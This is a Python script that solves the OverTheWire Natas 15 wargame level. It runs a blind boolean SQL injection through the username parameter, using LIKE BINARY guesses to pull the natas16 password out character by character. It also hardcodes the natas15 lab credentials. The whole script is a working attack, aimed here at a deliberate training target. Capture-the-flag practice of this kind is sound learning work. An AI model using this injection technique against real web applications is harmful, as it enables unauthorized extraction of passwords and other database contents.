
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = ""
auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

for i in range(len(auth[1])):
    for char in alnums:
        query = f'natas16" AND password LIKE BINARY "{passwd}{char}%'
        # print(query)
        req = requests.get(f'http://natas15.natas.labs.overthewire.org/index.php?username={query}',
                           auth=auth
                           )
        if "This user exists" in req.text:
            passwd += char
            break

print(passwd)
